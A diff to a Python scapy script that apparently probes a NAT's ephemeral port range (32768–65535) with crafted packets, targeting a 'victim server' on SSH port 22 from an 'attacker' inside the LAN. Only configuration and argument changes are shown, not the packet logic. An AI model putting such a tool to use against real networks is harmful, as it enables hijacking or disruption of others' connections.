@@ -10,8 +10,8 @@ from scapy.all import IP, TCP, send, AsyncSniffer, get_if_addr
 
 # ---------- CONFIG ----------
 IFACE = "wlo1"              
-START_PORT = 56000
-END_PORT = 60000            
+START_PORT = 32768
+END_PORT = 65535            
 BATCH_SIZE = 1000          
 SEND_DELAY = 0.00005        
 POST_WAIT = 0.25          
@@ -21,8 +21,9 @@ TTL_SYNACK = 3
 SEQ_C = 1000
 SEQ_S = 2000
 attacker_ip = "192.168.0.10" # Attacker's private IP in the NATed LAN
-server_ip = ""  # the victim server IP
-nat_ip = ""     # The NAT's public IP 
+server_ip = " "  # the victim server IP eg. 4.4.4.4
+SERVER_PORT = 22
+nat_ip = " "     # The NAT's public IP eg. 6.6.6.6
 # ----------------------------
 
 pkt_q = queue.Queue(maxsize=PKT_QSIZE)
@@ -116,7 +117,7 @@ if __name__ == "__main__":
     ap.add_argument("--batch_size", type=int, default=BATCH_SIZE)
     ap.add_argument("--delay", type=float, default=SEND_DELAY)
     ap.add_argument("--post-wait", type=float, default=POST_WAIT)
-    ap.add_argument("--server-port", type=int, default=22)
+    ap.add_argument("--server-port", type=int, default=SERVER_PORT)
     ap.add_argument("--live", action="store_true", help="send packets/if not set, cold run")
     args = ap.parse_args()
 
